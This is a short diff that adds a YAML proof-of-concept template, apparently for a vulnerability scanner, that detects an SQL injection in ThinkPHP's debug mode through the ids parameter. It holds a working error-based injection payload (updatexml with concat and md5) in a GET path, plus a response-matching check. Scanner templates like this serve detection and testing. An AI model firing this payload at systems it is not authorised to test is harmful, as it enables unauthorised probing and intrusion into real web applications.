@@ -1,0 +1,14 @@
+id: poc-yaml-thinkphp-debug-index-ids-sqli
+info:
+  name: ThinkPHP Debug 模式下 index/ids 参数 SQL 注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ThinkPHP
+  osprey-id: vb_2019_0069
+requests:
+- method: GET
+  path: /index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(2333)),0)]=1
+  expression: contains(body, "56540676a129760")
+variables: {}
+transport: http
